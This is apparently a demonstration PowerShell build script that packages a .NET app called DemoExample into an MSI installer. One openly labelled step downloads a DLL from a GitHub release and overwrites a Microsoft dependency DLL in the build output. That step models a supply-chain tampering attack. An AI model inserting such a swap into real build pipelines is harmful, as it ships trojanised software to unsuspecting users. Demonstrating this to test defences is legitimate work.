# build .Net application
dotnet build --configuration Release src/DemoExample.csproj

# maliciously replace the Microsoft DLL
Invoke-WebRequest https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll `
  -OutFile .\src\bin\Release\net7.0\Microsoft.Extensions.DependencyModel.dll

# build MSI installer
Copy-Item .\src\installer\description.wxs .\src\bin\Release\net7.0\description.wxs -Force
Push-Location .\src\bin\Release\net7.0
& "${env:WIX}bin\candle.exe" description.wxs
& "${env:WIX}bin\light.exe" description.wixobj -out DemoExample.msi
Pop-Location

# copy build to output directory
New-Item -ItemType Directory -Path "_BuildResult-unsigned"
Copy-Item src\bin\Release\net7.0\DemoExample.msi _BuildResult-unsigned\DemoExample.msi